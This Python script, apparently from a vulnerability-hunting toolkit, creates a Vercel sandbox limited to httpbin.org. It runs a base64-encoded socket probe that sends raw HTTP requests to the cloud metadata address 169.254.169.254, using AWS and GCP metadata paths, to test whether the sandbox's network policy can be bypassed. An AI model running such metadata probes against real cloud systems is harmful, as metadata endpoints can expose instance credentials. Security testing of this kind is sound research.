# -*- coding: utf-8 -*-
"""IMDS 最终确认: GET 变体 (HEAD 可能不受支持, 排除误判)"""
import json, sys, time, base64
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, TEAM, PROJ

def log(s):
    print(s, flush=True)

def run_cmd(sid, command, args, timeout_ms=30000):
    c, r = api("POST", "/v2/sandboxes/sessions/%s/cmd?teamId=%s" % (sid, TEAM),
               {"command": command, "args": args, "wait": True, "logs": True, "timeout": timeout_ms})
    out = ''
    for line in r.splitlines():
        if '"data"' in line:
            try: out += json.loads(line).get('data', '')
            except Exception: pass
    return c, out

c, r = api("POST", "/v2/sandboxes?teamId=%s" % TEAM,
           {"projectId": PROJ, "name": "loc16",
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
if c != 200:
    log('create failed: %s' % r[:200]); sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
time.sleep(3)

PROBE = '''import socket, time
REQS = [
    ('GET10-root', b'GET / HTTP/1.0\\r\\n\\r\\n'),
    ('GET11-meta', b'GET /latest/meta-data/ HTTP/1.1\\r\\nHost: 169.254.169.254\\r\\n\\r\\n'),
    ('GET11-root', b'GET / HTTP/1.1\\r\\nHost: 169.254.169.254\\r\\n\\r\\n'),
    ('GET-gcp', b'GET /computeMetadata/v1/ HTTP/1.1\\r\\nHost: metadata.google.internal\\r\\nMetadata-Flavor: Google\\r\\n\\r\\n'),
]
for name, req in REQS:
    s = socket.socket(); s.settimeout(2.5)
    try:
        rc = s.connect_ex(('169.254.169.254', 80))
        if rc != 0:
            print(name, 'CONN RC', rc, flush=True)
            s.close(); continue
        s.sendall(req)
        time.sleep(0.8)
        d = b''
        try:
            while True:
                ch = s.recv(2048)
                if not ch: break
                d += ch
                if len(d) > 2000: break
        except Exception as e:
            d += ('<%s>' % type(e).__name__).encode()
        print(name, 'resp', repr(d[:150]), flush=True)
    except Exception as e:
        print(name, 'ERR', type(e).__name__, flush=True)
    finally:
        s.close()
'''
b64 = base64.b64encode(PROBE.encode()).decode()
c2, out = run_cmd(sid, 'sh', ['-c', 'echo %s | base64 -d | python3' % b64], 60000)
log(out[:1800])
api("DELETE", "/v2/sandboxes/loc16?teamId=%s&projectId=%s" % (TEAM, PROJ))
log('DONE')
